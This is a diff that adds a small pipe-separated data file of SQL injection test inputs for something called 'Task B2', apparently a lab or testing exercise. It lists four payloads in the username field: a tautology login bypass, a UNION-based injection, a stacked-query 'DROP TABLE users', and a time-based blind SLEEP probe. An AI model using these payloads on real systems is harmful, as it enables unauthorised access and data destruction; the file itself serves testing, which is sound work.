@@ -1,0 +1,6 @@
+# Adversarial SQL Injection Payloads for Task B2
+# Format: username | password | attack_vector
+admin' OR '1'='1' -- | anything | Authentication bypass via tautology & SQL comment
+' UNION SELECT 1, 'attacker', 'admin' -- | x | UNION-based query structure alteration
+'; DROP TABLE users; -- | x | Stacked-query destructive injection probe
+admin' AND SLEEP(2) -- | x | Blind time-based injection probe
